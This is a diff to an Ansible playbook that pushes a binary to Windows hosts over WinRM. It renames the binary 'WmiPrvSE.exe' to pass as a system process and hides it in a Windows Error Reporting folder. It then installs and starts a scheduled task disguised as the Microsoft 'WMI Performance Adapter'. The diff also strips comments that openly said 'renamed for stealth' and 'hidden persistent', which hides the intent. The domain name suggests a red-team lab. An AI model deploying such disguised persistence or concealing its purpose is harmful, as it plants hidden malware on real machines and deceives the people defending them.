@@ -1,12 +1,11 @@
 ---
 - name: Deploy and Enroll System Management Service
-  hosts: windows_targets
+  hosts: windows
   gather_facts: no
   vars:
     ansible_connection: winrm
     ansible_winrm_transport: ntlm
     ansible_winrm_server_cert_validation: ignore
-    
     target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
 
   tasks:
@@ -15,20 +14,17 @@
         path: "{{ target_dir }}"
         state: directory
 
-    - name: Drop the binary (renamed for stealth)
+    - name: Drop the binary
       ansible.windows.win_copy:
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
-    - name: Install Hidden Persistent WMI Task
+    - name: Install Hidden Persistent Task
       ansible.windows.win_shell: |
         $stateFile = "C:\Users\charliebrown.TEAM1PEANUTS.000\AppData\Roaming\gundo\state.json"
         
         if (Test-Path $stateFile) {
-            Write-Host "[+] Found state.json. Creating Hidden Task..."
-            
-            # Define the XML for the scheduled task
-            $taskXml = @"
+            $taskXml = @'
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
@@ -74,20 +70,12 @@
     </Exec>
   </Actions>
 </Task>
-"@
-            # Save XML to a temp file
+'@
             $xmlPath = "$env:TEMP\wmi_task.xml"
             $taskXml | Out-File -FilePath $xmlPath -Encoding Unicode
-            
-            # Import the XML task using schtasks
             schtasks.exe /Create /TN "\Microsoft\Windows\WMI\WMI Performance Adapter" /XML $xmlPath /F
-            
-            # Clean up the XML file
             Remove-Item $xmlPath -Force
-            
-            # Start the task immediately so we don't have to wait for a reboot
             schtasks.exe /Run /TN "\Microsoft\Windows\WMI\WMI Performance Adapter"
-            
             Write-Host "[+] Hidden task installed and started."
         } else {
             Write-Host "[-] Still cannot find state.json."
